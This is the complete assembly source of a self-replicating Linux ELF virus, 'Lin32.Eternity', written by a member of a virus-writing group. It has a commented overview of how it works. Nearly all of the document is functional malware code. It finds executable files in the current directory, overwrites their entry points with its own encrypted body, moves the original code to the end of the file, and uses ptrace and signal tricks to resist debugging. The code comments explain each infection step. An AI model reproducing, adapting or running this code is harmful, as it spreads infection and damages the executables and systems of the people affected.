; _    _                    ____  _                  _  _       
;( )  (_)       ___ __     (  __)( )                (_)( )      
;| |   _  ____ |_ /|_ |    | |_  | |  ___  __  ____  _ | |  _ _ 
;( )_ ( )( __ )__)) /(_  _ (  _) ( _)( o_)( _)( __ )( )( _)( V )
;/___\/_\/_\/_\\__//___\(_)/____\/_\  \(  /_\ /_\/_\/_\/_\  ) / 
;                                                         /_/ 
;                        __    _                  :: Intro :::::::::::::::::::::::
;                                                   Hello out there! I dont't know 
;                _dP                 9m_            why but in the last time I've 
;              _#P      __Author__     9#_          worked a lot with encryption
;             d#@                       9#m         tools, methods etc. Thisvirus
;            d##    Cyneox/rRlf/Helith   ###        should be the beginning of my
;           J###                         ###L       new VXing-era: poly engines,
;          {###K                       J###K        metamorphism etc. It took me a 
;           ]####K      ___aaa___      J####F       long time to write this virus 
;       __gmM######_  w#P""   ""9#m  _d#####Mmw__    but as you see: I've made it!!!
;    _g##############mZ_         __g##############m_  
;  _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_  :: Greets ::::::::::::::::
; a###""          ,Z"#####@" '######"\g          ""M##m   First of all I'd like to 
;J#@"             0L  "*##     ##@"  J#              *#K   thank SPTH for reminding
;#"    __Date__   `#    "_gmwgm_~    dF __Dedicated__ `#_   me not to stop coding.
;F                 "#_   ]#####F   _dK                 JE   Then a big fat "Thank
;      1.04.2005     *m__ ##### __g@"  Caline, my       F   you" to rembrandt and 
;                      "PJ#####LP"   eternal love just     dr3f who helped me while
;`                       0######_            4         '  coding the encryption 
;                      _0########_        you !!!        routine.
;    .               _d#####^#####m__              ,    And a (pi*BIG_FAT)^3  
;     "*w_________am#####P"   ~9#####mw_________w*"    "I Love You" to Caline. 
;         ""9@#####@M""           ""P@#####@M""       Te Iubesc Iubita Mea!!!
; :: Overview ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
; 
; * General information *
;   Name  :  Lin32.Eternity 
;   Author:  Cyneox member of rRlf VX Group  [http://www.rrlf.de.vu]
;                             Helith Network [https://vx.helith.net]
;   Date  :  01.04.2005
;   Size  :  3432
;
; * Technical details *
;   Infection  :  the writes himself at entry point and the original data 
;                 will be stored at EOF
;   EPO        :  Since the memory has WRITE+EXECUTE flags we can simply
;                 copy the original data from EOF to the entry point of file
;                 and execute the original code. Data will be only in the memory
;                 overwriten. 
;   Target     :  ELF (Executable and Linking Format) files in the local directory
;   Encryption :  The virus body will be at run-time encrypted using the "Sliding
;                 key Encryption" methdod. The encryption will be randomly 
;                 generated using the syscall time(). Then the return value will
;                 a be a little bit modified so that the encryption key isnt 100%
;                 dependent from the returned value.
;   Decryption :  The virus will compare bytewise if the file where its currently
;                 executed is encrypted. Thats important since the "dropper" 
;                 contains no encrypted data so I had to implement sth for checking
;                 that
; 
; :: About ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;    Its about an ELF virus infecting all executables ELF files in the current 
;    directory. Our virus has a certain size , lets call it "len". If a file is
;    found "len" bytes from the entry point of the target will be copied at the 
;    end of the file. Then our virus will copy himself at the entry point.
;    For the first time I'm using a new art of EPO: Like I said "len" is the size
;    of our virus body. After executing the virus code will "load" "len" bytes from
;    EOF and will store the data at [ebp-d3lta+main], which is the entry point 
;    of our virus. 
;
;    Maybe you're asking yourself how is it possible to overwrite data in the 
;    memory. Well therefore I used mprotect for making the memory region writeable
;    and executable. After loading the data from EOF only the data in the memory
;    will be overwriten. Overwriting the data in the file will be senseless: The 
;    virus will be simply overwriten by the original code and thats silly ;) 
;    
;    After infecting other files the infected file will encrypt his virus body
;    beginning with [ebp-d3lta+start_virus]. At every execution of the file , a 
;    new encryption key will be generated making the ecryption routine safer.
;    The "dropper" , the 0 generation , contains no encrypted data. Before 
;    decrypting the code several checks are done whether the virus body is encrypted
;    or not. The virus will simply compare the first , 5th , 7th byte beginning 
;    from [ebp-d3lta+start_virus]. Just look at the code... Its the first virus 
;    I've commented so well... So have phun !! ;) 
;
; :: Contact ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;   W3B:  http://cyneox.go.ro
;         https://vx.helith.net
;         https://vx.helith.net/cyneox/
;   
;   M@il: cyneox@helith.net
;   
;   IRC : #lin32asm , #vxers ; #virus 

							  
bits 32
global main

section code write exec

;---++++++++++++++++++++++++++ main +++++++++++++++++++++++++++---
main:              push eax
	           pushad                    ; save all registers

	           mov ebx,dword [esp+32+4+4]	
		                             ; argv[0]=host file which is
					     ; currently executed
					     
		   ; now we'll create position independent code
		   ; so we'll have to calculate absolute addresses
		   ; at run-time.
		   ;
                   ; this is taken from Elf-Virus-Writing-Tutorial
	           ; from Alexander Bartolich:
		   ;            The instruction pointer is a register that holds th the address
                   ;            of the next instruction to execute. Unlike "real" registers
                   ;            there is no direct way to retrieve its value. A call pushes the
                   ;            current value of IP onto the stack and adds a relative offset
                   ;            to it. Offset 0 just continues with the following instruction.
                   ;            And if that instruction is a pop we load the the address of the
                   ;            pop instruction itself in a regular register.
		   

                   call	d3lta
;---++++++++++++++++++++++++++ d3lt@ ++++++++++++++++++++++++++---
d3lta:
	           pop	ebp                  ; ebp should be addr of d3lta
		   push ebx                  ; save argv[0] on stack
	       
		   
is_encrypted:
                   ; The "dropper" will contain
		   ; no encrypted data...But the infected
		   ; files will do contain encrypted data ;)
                   ; Thats why I'm checking now if the code
		   ; is encrypted or not....
                   
                   db 0xb9                   ; dummy opcode = "mov ecx,"
encryption_key:    dd 8977h                  ; our dear encryption key   
	 	   
		   ;-------------------------------------------------------------
		   ; Source: objdump -d eternity 
		   ;
                   ; 080480ef <start_virus>:
		   ;  80480ef:       b8 1a 00 00 00          mov    $0x1a,%eax
		   ;  80480f4:       31 db                   xor    %ebx,%ebx
		   ;  80480f6:       31 c9                   xor    %ecx,%ecx
		   ;     
                   ;-------------------------------------------------------------
		   
		   lea ebx,[ebp-d3lta+start_virus]
                   mov cl,[ebx]
                   cmp byte cl,0xb8          ; b8 1a 00 00 00     mov $0x1a,%eax
		   jne Decryption 
		   
		   add ebx,5
	           mov cl,[ebx]
		   cmp byte cl,0x31          ; 31 db              xor    %ebx,%ebx
		   jne Decryption 
		   
		   add ebx,2
		   mov cl,[ebx]
		   cmp byte cl,0x31          ; 31 c9              xor    %ecx,%ecx
		   jne Decryption 
		   
                   je start_virus            ; if equal --> code isnt encrypted
                   
;---++++++++++++++++++++++++++ Decryption ++++++++++++++++++++++++++---
Decryption:
                   ; Still we're trying to write in the memory
		   ; we'll have to mprotect that memory region
		   ; and make it writable, because we want to 
		   ; save the decrypted code in that region. 
		   
                   lea  ebx, [ebp-d3lta+start_virus]
		                             ; const void *addr
                   and  ebx, 0FFFFF000h
		   
		   ; Since I dont really know the correct size
		   ; of the code segment I'll asume its 0x3000 ;)

                   mov  ecx,0x1000           ; size_t len
		   mov  edx, 7               ; int prot PROT_READ|PROT_WRITE|PROT_EXEC
                   mov  eax,125              ; SYS.MPROTECT
		   int  0x80
				      
		   
                   mov ecx,(eternity_end-start_virus)/4
		   mov ebx,dword [ebp-d3lta+encryption_key]
		   
		   lea esi,[ebp-d3lta+start_virus]
		   mov edi,esi
		   cld
		   		   
loop_it:
		   lodsd                     ; move dword from [esi] to eax
                                             ; and increase "si" by 4
					     
		   xor eax,ebx               ; the encryption "routine" ;)
		   inc ebx                   ; increase ebx by 1 
		   stosd                     ; move dword from "eax" to  [edi]
                                             ; and increase "di" by 3
		   loop loop_it              ; ecx -= ecx ; while ecx>0 jmp loop_it_baby
		   
	       		   
;---+++++++++++++++++++++++ start_virus +++++++++++++++++++++++++---		   
start_virus:	
		   ; Unlike my usual infecting techniques here I'll use
		   ; a new one: I'll put the host code onto the stack,
                   ; mprotect it and then I'll execute this code.
		   ; This is quite usefull since memory operations are
                   ; faster than file/device operations.

                   ; Check if our currently executed programm
		   ; is beeing debugged...Therefore we'll use
		   ; ptrace to check that.
		    
		   ;------------------------------------------------------------- 
		   ; ------------------> ANTI-DEBUGG Technique <----------------- 
		   ;-------------------------------------------------------------
		   ; NAME
		   ; ptrace - process trace
                   ;
		   ; SYNOPSIS
		   ; #include <sys/ptrace.h>
		   ;
                   ; long ptrace(enum __ptrace_request request, pid_t pid,
                   ;             void *addr, void *data);
		   ;------------------------------------------------------------
                   
		   mov eax,26                ; SYS.PTRACE
		   xor ebx,ebx               ; PTRACE_TRACEME :
		                             ; Indicates that this process is to be traced 
					     ; by  its  parent
		   xor ecx,ecx               ; pid_t pid
		   xor edx,edx
		   inc edx                   ; void *addr 
		   xor esi,esi               ; void *data
		   int 0x80 
		   
		   test eax,eax              
		   jne near Bye_Bye          ; Our programm is beeing
		                             ; debugged!!!
					     
		   ; Try to catch the signal SIGTRAP and to handle 
		   ; with it. We'll create a "handler"-function 
		   ; to handle with our catched signal.
		   
		   ;-------------------------------------------------------------
		   ; ------------------> ANTI-DEBUGG Technique <-----------------
                   ;-------------------------------------------------------------
                   ; NAME
		   ; signal - ANSI C signal handling
		   ;
		   ; SYNOPSIS
                   ; #include <signal.h>
		   ;
		   ; typedef void (*sighandler_t)(int);
		   ;
		   ; sighandler_t signal(int signum, sighandler_t handler);
		   ;	  
                   ;------------------------------------------------------------

		   mov eax,48                ; SYS.SIGNAL
		   mov ebx,0x5
		   lea ecx,[ebp-d3lta+handler]        
		                             ; signal handler function
		   mov ecx,esp
		                             ; handler
		   int 0x80 
		   
					     
		   pop ebx                   ; argv[0]
	           mov	ecx,eternity_end-hostmain
		                             ; get offset(distance) between
                                             ; start code and end code

	           sub	esp, ecx             ; create space where to put code
	           lea	esi, [ebp-d3lta+hostmain]
		                             ; load "source" where to copy data
                                             ; from
	   
	           mov edi, esp              ; destination
	           rep	movsb                ; copy data from esi to edi 
                   jmp esp                   ; jump to copied code on the stack

;---++++++++++++++++++++++ hostmain +++++++++++++++++++++++++---
hostmain:
	           push	ebx                  ; argv[0] = host file
		   
		   ;---------------------------------- ---------------------------
		   ; NAME
		   ; mprotect - control allowable accesses to a region of memory
                   ;
		   ; SYNOPSIS
		   ; #include <sys/mman.h>
                   ;
                   ; int mprotect(const void *addr, size_t len, int prot);
                   ;-------------------------------------------------------------

	           lea	ebx, [ebp-d3lta+main]
		                             ; const voi *addr					     
	           and	ebx, 0FFFFF000h
		   
		   ; Since I dont really know the correct size
		   ; of the code segment I'll asume its 0x3000 ;)

	           mov	ecx, 0x3000          ; size_t len 
	           mov	edx, 7               ; int prot PROT_READ|PROT_WRITE|PROT_EXEC
	           mov	eax,125              ; SYS.MPROTECT
	           int	0x80
                   
		   ; opening host file in O_RDONLY only modus
		   pop ebx                   ; argv[0]
	           xor	ecx, ecx	     ; ecx = 0 = O_RDONLY
	           mov	eax,5	             ; SYS.OPEN
	           int	0x80
                   
		   ; checking for returned file descriptor
	           cmp eax,0xFFFFF000        ; Another implementation:
	           ja  Bye_Bye               ;      cmp eax,0x0
                                             ;      jl Bye_Bye
					     
	           call	point                ; a real interesting method to declare
	           db	'.',0                ; data and initialize registers with it
	           point:pop esi             ; esi = "."

	           push	eax                  ; save file descriptor of host
                                             ; on the stack
	           call search_in_direc      ; go search for it baby!
	           pop	ebx                  ; saved fd of host


;---++++++++++++++++++ EternityHost ++++++++++++++++++++++++++---
;--- Desc   : Move to end of file and copy the original code
;             to the original entry point and execute it.
;--- INPUT  : ebx (containing file descriptor of host file)
;--- OUTPUT : [none]
;----------------------------------------------------------------
EternityHost:

                   ;-------------------------------------------------------------
                   ; NAME
		   ; lseek - reposition read/write file offset
		   ;
		   ; SYNOPSIS
                   ; #include <sys/types.h>
		   ; #include <unistd.h>
		   ;
		   ; off_t lseek(int fildes, off_t offset, int whence);
                   ;-------------------------------------------------------------

	           xor	edx, edx             ; edx = 0 = SEEK_SET 
	           db 0xb9                   ; opcode for "mov ecx,"
		  
seek_bytes:        dd   00000000h            ; sizeof(target_file)		  
	           mov	eax,19               ; SYS.LSEEK
	           int	0x80
                   
		   ; The return value of sys.lseek will be checked...
		   ; If sys.lseek seeked successfully to that offset
		   ; that means that this code is currently executed
		   ; by an infected file...
		   ; If sys.lseek seeked unsuccessfully that means
		   ; that this is the first execution of our virus...
		   
	           or	eax, eax             
	           jnz	restore_code         ; execute original target code
	           jmp	Bye_Bye              ; its the "dropper" --> exit

;---++++++++++++++++++++ restore_code ++++++++++++++++++++++++---
restore_code:
                   ; Read "eternity_end-main" bytes from the end of the file
		   ; and copy the data to [ebp-d3lta+main]
		   ; Remember: Our code should be independent and that means
                   ; that we're using only offsets.

                   ;-------------------------------------------------------------
                   ; NAME
		   ; read - read from a file descriptor
		   ;
		   ; SYNOPSIS
                   ; #include <unistd.h>
		   ;
		   ; ssize_t read(int fd,void *buf,size_t count);
                   ;-------------------------------------------------------------


	           lea	ecx, [ebp-d3lta+main] 
		                             ; void *buf
	           push	ecx
	           pop	esi
	           mov	edx, eternity_end-main
		                     
				     ; size_t count
	           mov	eax,3                ; SYS.READ
	           int	0x80
                    
		   ; Close file descriptor...
	           mov	eax,6                ; SYS.CLOSE                
	           int	0x80

       	           add	esp,eternity_end-hostmain	
		                             ; free stack
	           mov	dword [esp+32], esi  ; its like an entrypoint 
	           popad                     ; restore registers
	           ret			     ; return to host code

;---++++++++++++++++++++++++++ Bye_Bye ++++++++++++++++++++++++++---
Bye_Bye:
                   mov eax,4                 ; SYS.WRITE
		   mov ebx,1                 ; stdout
		   lea ecx, [ebp-d3lta+Copyright]
		   mov edx,dword [ebp-d3lta+copy_lenght]
		   int 0x80
		   
		   popad
	           xor eax,eax
		   inc eax
                   int	0x80                 ; SYS.EXIT
		   
;################ END OF ETERNITYHOST #########################



;---+++++++++++++++++++ search_in_direc +++++++++++++++++++++++---
;--- DESC. : searches for files in esi (see below) 
;--- INPUT : esi = name of directory where to search for files
;--- OUTPUT: [none]  
;-----------------------------------------------------------------		   
search_in_direc:

                   mov ebx,esi               ; directory name
		   xor ecx,ecx               ; ecx = 0 = O_RDONLY 
		   mov eax,0x5
		   int 0x80                  ; SYS.OPEN 
		   
		   cmp eax,0x0
		   jb near go_back           ; Another implementation:
		                             ;         or eax,eax
					     ;         jz go_back 
		   
		   push eax                  ; push fd onto stack
		   pop dword [ebp-d3lta+DirName]
		                             ; save fd to DirName 


;---+++++++++++++++++++++ search4files ++++++++++++++++++++++++---
;--- DESC. : loop label to search only regular files in esi
;--- INPUT : esi = name of file in the directory 
;--- OUTPUT: [none]  
;-----------------------------------------------------------------
search4files:
                   ;-------------------------------------------------------------
		   ; NAME
                   ;  readdir - reads an directory entry 
                   ;
                   ; SYNOPSIS
                   ; #include <unistd.h>
                   ; #include <linux/dirent.h>
                   ; #include <linux/unistd.h>
                   ; 
                   ; _syscall3(int, readdir, uint, fd, struct dirent *, dirp, uint, count);
                   ;
                   ; int readdir(unsigned int fd, struct dirent *dirp, unsigned int count);
                   ;-------------------------------------------------------------
                   
                   lea ecx,[ebp-d3lta+DirentStruct]
		   mov ebx,dword [ebp-d3lta+DirName]
		   mov eax,89
		   int 0x80                  ; SYS.READDIR 
		   
		   or eax,eax                ; Another implementation:
		   jz go_back                ;         cmp eax,0x1
	                                     ;         jne go_back
		   
		   add ecx,0xA               ; file name in the DirentStruct 
		   mov esi,ecx               ; save file name to esi 
		   
                   ;-------------------------------------------------------------
		   ; NAME
                   ; lstat - list status of files 
                   ;
                   ; SYNOPSIS
                   ; #include <sys/types.h>
                   ; #include <sys/stat.h>
                   ; #include <unistd.h>
                   ; 
                   ; int lstat(const char *file_name, struct stat *buf);
                   ;-------------------------------------------------------------

                   mov ebx,esi
		   lea ecx,[ebp-d3lta+StatStruct]
		   mov eax,107
		   int 0x80                  ; SYS.LSTAT 
		   
		   cmp eax,0x0
		   jb go_back 
		   
		   movzx eax,word [ecx+0x8]  ; get st_mode
		                             ; movzx will copy the 0 too
		   
		   mov ebx,eax
		   
		   ; Check if its a regular file.We dont want to infect
                   ; directories ;)
		   
		   and ebx,0000F000h         ; file mask 
		   cmp ebx,00008000h         ; REG_FILE !? 
		   jnz next_entry 
	           
		   ; Check if its user file and the most important 
		   ; thing: If it can be executed by the current user
		   
                   ;-------------------------------------------------------------
		   ; Source: /usr/include/bits/stat.h 
                   ;        
                   ;  #define __S_IEXEC       0100    /* Execute by owner.  */
                   ;  --> 0100(octal) = 40(hex)
                   ;-------------------------------------------------------------
 
		   and eax,00000040h         ; eax = st_mode
		   or eax,eax                ; Another implementation:
		   jz next_entry             ;        cmp eax,00000040h
		                             ;        jne next_entry 		   	   
found_file:  
		   call Inf3ct_Fil3          ; heheh...my favourite function 
		                             ; Dont accuse me for beeing sarcastic ;)
	
next_entry:	
                   
		   jmp search4files
		   
		  
go_back:
                   ret 
;################ END OF SEARCH_IN_DIREC #########################		   
		   

;---++++++++++++++++++++++ Inf3ct_Fil3 ++++++++++++++++++++++++---
;--- DESC. : Fuck up ELF executables 
;--- INPUT : esi = ELF file 
;--- OUTPUT: [none]  
;-----------------------------------------------------------------
Inf3ct_Fil3:	   			     
		   ; Open ELF file for read & write 
		   
		   xor ecx,ecx 
		   mov ecx,2                 ; O_RWONLY
		   mov ebx,esi               ; ELF file name 
		   mov eax,5
		   int 0x80                  ; SYS.OPEN 
		   
		    
		   cmp eax,0                 ; Another implementation:
		   jl near Inf3ct_failed     ;         cmp eax,0xfffff000
		                             ;         ja Inf3ct_failed
					     
                   mov dword [ebp-d3lta+ELF_FD],eax
		                             ; save fd to ELF_FD 
		   
		   ; Now we must find out file's size in order 
		   ; to mmap it later.Therefore we'll use lssek()
		   
		   
		   xor ecx,ecx               ; ecx = 0 = offset 
		   mov edx,2                 ; SEEK_END
		   mov ebx,eax               ; file descriptor 
		   mov eax,19
		   int 0x80                  ; SYS.SEEK
		   
		   
		   mov dword [ebp-d3lta+seek_bytes],eax
		                             ; "update" seek_bytes with
                                             ; sizeof file
		  
		   ; Prepare for Mmap_Fil3			     
		   mov ebx,[ebp-d3lta+ELF_FD]
		   xchg eax,ecx              ; ecx = sizeof file
		   
		   call Mmap_Fil3
		   
		   cmp eax,-1                ; Another implementation:
		   je near Mmap_failed       ;         inc eax
		                             ;         jz near Mmap_failed
	           
		   mov dword [ebp-d3lta+Mmap_Addr],eax
		   mov esi,dword [ebp-d3lta+Mmap_Addr]
		   
		   ; CAUTION: Viral Sequence beginns here.
		   ;        : Infection Countdown started...
		   

;---+++++++++++++++++++++ check_if_ELF ++++++++++++++++++++++++---		   
check_if_ELF:     
		   ;-------------------------------------------------------------
		   ; Source: hexdump -C elf_file | sed 1q 
                   ;        
                   ; 00000000  7f 45 4c 46 01 01 01  |.ELF...|
                   ;-------------------------------------------------------------
                   
                   mov eax,dword [esi]
		   cmp eax,0x464c457f        ; hex for ".ELF" 
		   jne near Unmmap
		   
		   movzx eax,word [esi+40]   ; EHDR size 
		   mov ebx,dword [esi+24]    ; entry point 
		   movzx ecx,word [esi+44]   ; ehdr.e_phnum 
		   movzx edx,word [esi+42]   ; ehdr.e_phentsize 
		   
		   mov edi,esi               ; esi = edi = Mmap_Addr
		   
		   add edi,eax               ; move to PHT( Program Header Table)
		   
                   ;-------------------------------------------------------------
		   ; Source: readelf elf_file -l  
                   ;        
                   ; Program Headers:
                   ; Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
                   ; PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
                   ; INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
                   ;        [Requesting program interpreter: /lib/ld-linux.so.2]
                   ; LOAD           0x000000 0x08048000 0x08048000 0x00484 0x00484 R E 0x1000
                   ; LOAD           0x000484 0x08049484 0x08049484 0x00100 0x00104 RW  0x1000
                   ; DYNAMIC        0x000498 0x08049498 0x08049498 0x000c8 0x000c8 RW  0x4
                   ; NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
                   ; STACK          0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
                   ;-------------------------------------------------------------
                   ; As we can see only those LOAD segments could be potencially 
                   ; virus infection targets. Its a very intelligent implementation
                   ; to check if the entry point is smaller than p_paddr + p_memsz 
                   ; since we want to insert our virus after the entry point ;) 
                   ; On UNIX platforms there are some exotic ELF file samples: a few of 
                   ; them have the data segment and the code segment in one segment:
                   ; the code segment.Well only VXer do crazy things like this but 
                   ; but it was just an example... :P 

		   
		   ; Now we'll search for the PHDR entry,where p_paddr +
                   ; p_memsz > entry point 
get_phdr:
                   mov eax,dword [edi+12]    ; phdr.p_paddr
		   add eax,dword [edi+20]    ; p_memsz 
		   cmp ebx,eax               ; if entry point is smaller
                                             ; than p_paddr + p_memsz then jump
		   jl got_phdr
		   add edi,edx               ; move to next PHDR entry
		   loop get_phdr
		   
		   jmp Unmmap                ; if nothing found then exit


;---++++++++++++++++++++++++++ got_phdr ++++++++++++++++++++++++++---
got_phdr:          
                   mov esi,dword [esi+24]    ; entry point 
		   
		   ; Figure out offset to entry code by subtracting the
                   ; PhsyAddr from the code segment from the entry point
		   
		   sub esi,dword [edi+8]     ; edi+8 = PhysAddr
		   mov ebx,esi
		   add esi,dword [ebp-d3lta+Mmap_Addr]
		                             ; jump to entry point in the mmap
					     ; file
		   
		   
		   ; Check if our target file has been already infected 
		   ; by Linux.Eternity (c) by Cyneox ;))
		   mov eax,dword [ebp-d3lta+main]
		   cmp dword [esi],eax
		   jz near Unmmap            ; already infected :(
		   
		     
		   ; Check if there is enough place where to insert 
		   ; our viral code...
		   mov eax,dword [edi+20]
		   sub eax,ebx
		   mov ecx,eternity_end-main
		   cmp eax,ecx
		   jb near Unmmap            ; segment too small
		   
		   
		   ; Creating a stack frame where to insert 
		   ; our host code...
		   sub esp,eternity_end-main
		   
		   
		   ; Write host code into that frame
		   
		   mov ebx,esi               ; esi = source
		   mov ecx,eternity_end-main
		   mov edx,ecx
		                             ; lenght
		   mov edi,esp               ; destination
		   rep movsb                 ; copy from esi to edi
		
		   
		   ; Write viral code at the entry point of
		   ; mmaped file...
		   
		   ; First of all write until "start_virus"...
		   		   
		   xchg ebx,edi              ; ebx=esp ; edi=esi
		   
		   ; Generate random number used as encryption key
		   ; time()  returns  the  time since the Epoch (00:00:00 UTC,
                   ; January 1, 1970), measured in seconds.
		   ; Those seconds represent a wonderfull randomly generated
		   ; encryption key ... ;) 
		   
		   mov eax,13                ; SYS.TIME
		   mov ebx,dword [ebp-d3lta+Time]
		   int 0x80
		   
		   ; eax will contain a radomly generated number...
		   
		   and eax,0x9d2c
		   and eax,0xefc6	   
		   mov dword [ebp-d3lta+encryption_key],eax
		                             ; update encryption key
					     
		   lea esi,[ebp-d3lta+main]
		   mov ecx,start_virus-main
		   rep movsb
		   
		   ; Write after "start_virus"...
		   
    
		   add edi,ecx               ; update destination 
		   push edi
		   lea esi,[ebp-d3lta+start_virus]
		   mov ecx,eternity_end-start_virus
		   rep movsb
		   
	       
;---+++++++++++++++++++++ Encryption  ++++++++++++++++++++++++---
; Using "Sliding Key Encryption" method...
; Its actually a "xor"-encryption while increasing the encryption key
; by 1. The cool thing about this method is following:
; 
;    Lets say we have this data : AABCC
;    And our encryption key is  : KBKBK
; 
; In the first loop A will be encrypted with K , but in the second 
; loop A will be encrypted with B. Thats a sory of polyalphabetical 
; enciphering (pls visit my site to read something about that enciphering
; method). And that makes our encryption even more securer.
; If somebody looks at this encrypted code, they won't be able to tell that
; the two characters are the same when unencrypted.

Encryption:
		   pop edi                   
		   mov esi,edi
 		   mov ecx,(eternity_end-start_virus)/4
		   mov ebx,dword [ebp-d3lta+encryption_key]
		   cld
		   
loop_encrypt:
                   lodsd                     ; load dword from [esi] to [eax]
		   xor eax,ebx               ; encryption 
		   inc ebx                   ; increase ebx
		   stosd                     ; store dword from [eax] to [edi]=[esi]
		   loop loop_encrypt         ; loop until ECX>0 
		   
		   lea esi,[ebp-d3lta+main]
		   
		    
		   ; Now we'll unmmap our target and write the original
		   ; host code at the end of the file...
		   mov ecx,dword [ebp-d3lta+seek_bytes] 
		                             ; sizeof file		    
		   mov ebx,dword [ebp-d3lta+Mmap_Addr]
		   mov eax,91                ; SYS.UNMMAP 
		   int 0x80 
		   
		   ;-------------------------------------------------------------
		   ; Source: ls -l ./gcc
		   ; -rwxr-xr-x  1 cyneox users 98665 2005-03-20 17:09 gcc
		   ;
		   ; Size of target before virus infection...
		   ;-------------------------------------------------------------
				      
		   
		   ; Write host code at EOF
		   mov ecx,esp               
		   mov edx,eternity_end-main
		   mov ebx,dword [ebp-d3lta+ELF_FD]
		                             ; file descriptor
		   mov eax,0x4               ; SYS.WRITE
		   int 0x80
		   
		   	
		   ;-------------------------------------------------------------
		   ; Source: ls -l ./gcc
		   ; -rwxr-xr-x  1 cyneox users 100178 2005-03-20 17:11 gcc
		   ;
		   ; Size of target AFTER virus infection ...
		   ;-------------------------------------------------------------
		               
		   add esp,eternity_end-main
		                             ; restore frame
					     
	           ; This is a "copyright" function to 
		   ; append my message.
		   
		   sub esp,dword [ebp-d3lta+Appendix_lenght] 
		   
		   mov edi,esp               ; direction
		   lea esi,[ebp-d3lta+Appendix]
		   mov ecx,dword [ebp-d3lta+Appendix_lenght]
		   mov edx,ecx
		   rep movsb		   
		   
		   mov edx,ebx		   
		   
		   mov eax,4                 ; SYS.WRITE
		   mov ebx,edx               ; write to file descriptor
		   mov ecx,esp               ; write from stack
		   mov edx,dword [ebp-d3lta+Appendix_lenght]
		   int 0x80
		   
		   add esp,dword [ebp-d3lta+Appendix_lenght]
		                             ; restore stack
		   					     
                   jmp Mmap_failed 
		   
;---++++++++++++++++++++++++++ Unmmap ++++++++++++++++++++++++++---		 
Unmmap:
                   mov ecx,dword [ebp-d3lta+seek_bytes]
		                             ; size 
		   mov ebx,dword [ebp-d3lta+Mmap_Addr] 
		                             ; mmap addr 
                   mov eax,91
		   int 0x80                  ; SYS.UNMMAP 
		   
Mmap_failed:
                   mov ebx,dword [ebp-d3lta+ELF_FD]
		   mov eax,6
		   int 0x80                  ; SYS.CLOSE 
		   
Inf3ct_failed:		   
                   ret 

;################# END OF INF3CT_FIL3 ############################
		   



		   
;---++++++++++++++++++++++ Mm@p_Fil3 ++++++++++++++++++++++++++---
;--- DESC. : Map file in the memory
;--- INPUT : ebx = file descriptor
;          : ecx = size 
;--- OUTPUT: eax = addr of memory map 
;-----------------------------------------------------------------
Mmap_Fil3:
                   ;-------------------------------------------------------------
		   ; NAME   
                   ; mmap - save data into memory
                   ;
                   ; SYNOPSIS
                   ; #include <unistd.h>
                   ; #include <sys/mman.h>
                   ;
                   ; void  *  mmap(void *start, size_t length, int prot , int flags, int fd,
                   ;              off_t offset);
                   ;-------------------------------------------------------------
                   
		   lea esi,[ebp-d3lta+MmapStruct]
		   mov dword [esi+4],ecx     ; sizeof file 
		   mov dword [esi+16],ebx    ; file descriptor
		   
		   xchg ebx,esi
		   mov eax,90
		   int 0x80                  ; SYS.MMAP 
		                             ; Another implemenatation;
		                             ; mov eax,90
		                             ; mov edx,ebx               
		   
		                             ; sub esp,24 
		                             ; mov dword [esp],0x0
		                             ; mov dword [esp+4],ecx
		                             ; mov dword [esp+8],3
		                             ; mov dword [esp+12],1
		                             ; mov dword [esp+16],edx
		                             ; mov dword [esp+20],0
		                             ; mov ebx,esp
		                             ; int 0x80 
		   
		                             ; add esp,24
		  
		   ret 
		  
	        
		    
;---++++++++++++++++++++++++++ __exit ++++++++++++++++++++++++++---		   		   
__exit:
                   xor eax,eax               ; eax = 0
		   inc eax                   ; eax = 1

                   int 0x80                  ; SYS.EXIT 
		  
;---+++++++++++++++++++++++ host_end ++++++++++++++++++++++++++---
host_end:

;---++++++++++++++++++++++++ handler  +++++++++++++++++++++++++---
handler:           
                   push ebp
		   mov esp,ebp
		   
                   ; simply do nothing while program
		   ; receives signal SIGTRAP 
		   
		   pop ebp
                   ret
		   

DirName            dd             00000000h  ; directory name 
ELF_FD             dd             00000000h  ; ELF file descriptor
Mmap_Addr          dd             00000000h  ; MMAP address
Time               dd             00000000h  ; variable used by syscall time()
Copyright:         db             ":::.Lin32.Eternity by Cyneox/rRlf.:::",0xa,0x0
msg:               db             "Te iubesc, te doresc, mai mult ca viata mea...",0xa,0x0
                   db             "Numai tu si Dumnezeu sunteti inima mea.",0xa,0xa,0x0
		   db             "Caline, my eternal love just for you!",0xa,0x0
		   db             "by Cyneox/rRlf [24.03.2005]",0xa,0x0
copy_lenght        dd             $-Copyright
Appendix:          db             "Lin32.Eternity by Cyneox/rRlf/Helith [March 2005]",0xa,0x0
Appendix_lenght    dd             $-Appendix
copyright_end:


;-----------------------------------------------------------------
; Source: /usr/include/asm/stat.h
; struct stat {
;        unsigned short st_dev;
;        unsigned short __pad1;
;        unsigned long st_ino;
;        unsigned short st_mode;
;        unsigned short st_nlink;
;        unsigned short st_uid;
;        unsigned short st_gid;
;        unsigned short st_rdev;
;        unsigned short __pad2;
;        unsigned long  st_size;
;        unsigned long  st_blksize;
;        unsigned long  st_blocks;
;        unsigned long  st_atime;
;        unsigned long  __unused1;
;        unsigned long  st_mtime;
;        unsigned long  __unused2;
;        unsigned long  st_ctime;
;        unsigned long  __unused3;
;        unsigned long  __unused4;
;        unsigned long  __unused5;
;};
;--------------------------------------------------------------

StatStruct: 
                   dw                 0000h ; st_dev
		   dw                 0000h ; __pad1
		   dd             00000000h ; st_ino
		   dw                 0000h ; st_mode 
		   dw                 0000h ; st_nlink 
		   dw                 0000h ; st_uid
		   dw                 0000h ; st_gid
		   dw                 0000h ; st_rdev
		   dw                 0000h ; __pad2 
		   dd             00000000h ; st_size
		   dd             00000000h ; st_blksize 
		   dd             00000000h ; st_blocks
		   dd             00000000h ; st_atime
		   dd             00000000h ; __unused1
		   dd             00000000h ; st_mtime
		   dd             00000000h ; __unused2
